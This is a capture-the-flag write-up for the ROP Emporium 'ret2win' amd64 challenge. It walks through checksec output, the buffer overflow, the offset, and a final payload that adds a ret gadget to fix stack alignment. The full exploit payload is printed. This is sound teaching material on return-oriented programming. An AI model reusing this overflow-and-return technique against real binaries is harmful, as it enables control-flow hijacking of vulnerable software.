# 🧠 ret2win – ROP Emporium Challenge

> Category: Binary Exploitation – ROP Basics  
> Difficulty: Easy  
> Arch: `amd64`  
> Objective: Exploit a buffer overflow to call the hidden `ret2win` function and retrieve the flag.

---

## 🛠️ 1. Initial Analysis

We begin by inspecting the binary protections using `checksec`:

```bash
checksec ret2win
```

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
Stripped: No
```

### ✅ Observations:
- **NX enabled**: Code execution on the stack is not allowed.
- **No PIE**: All addresses are fixed – makes exploitation easier.
- **No canary**: The stack can be overflowed without detection.
- **Not stripped**: We can locate useful functions with `nm`.

---

## 🔍 2. Locating the Goal

We use `nm` to find the address of the `ret2win` function:

```bash
nm ret2win
```

```
0000000000400756 t ret2win
```

The goal is to **call `ret2win()`**, which is not called by default but contains the flag.

---

## 🧠 3. Vulnerability Discovery

Using reverse engineering tools like **Ghidra**, we discover a **buffer overflow** vulnerability in the main function. Specifically:

- The binary reads **56 bytes** from input (`read(0, local_28, 0x38)`),
- Into a buffer of only **32 bytes** on the stack.

This means we can **overwrite the return address** with a carefully crafted payload.

---

## 🧪 4. Crafting the Exploit

We calculate the offset needed to reach the return address:  
```python
offset = 40  # (based on cyclic patterns)
```

Initial payload attempt:

```python
payload  = b"A" * offset
payload += p64(0x400756)  # address of ret2win()
```

But when we run this, the binary crashes with:

```
0x7ffff7c5843b <do_system+363>: movaps xmmword ptr [rsp + 0x50], xmm0
<[0x7fffffffdc78] not aligned to 16 bytes>
```

### ❗ Root Cause:
This happens because **`rsp` is not aligned to a 16-byte boundary**, and the `movaps` instruction requires 16-byte alignment when working with `xmm` registers (SSE).

---

## 🧯 5. Fixing Stack Alignment (with a `ret` Gadget)

To fix the alignment, we insert a **dummy `ret` instruction** before calling `ret2win`.  
This extra `ret` shifts `rsp` by 8 bytes, thus **aligning it properly**.

```bash
objdump -d ret2win | grep ret
```

Find a nearby `ret` instruction, e.g., at address `0x400755`.

### ✅ Final Exploit Payload:

```python
offset = 40
payload  = b"A" * offset
payload += p64(0x400755)  # ret (alignment fix)
payload += p64(0x400756)  # call ret2win()
```

---

## 🎯 6. Result

Running the binary with this payload successfully calls `ret2win`, and we get the flag:

```
ROPE{a_placeholder_32byte_flag!}
```

---

## 🧠 Key Takeaways

- Always check for **stack alignment issues** when using ROP on `x86_64`.
- `movaps` crashes are common when `rsp` is not 16-byte aligned.
- A **`ret` gadget** can be used to realign the stack before calling functions that use SSE.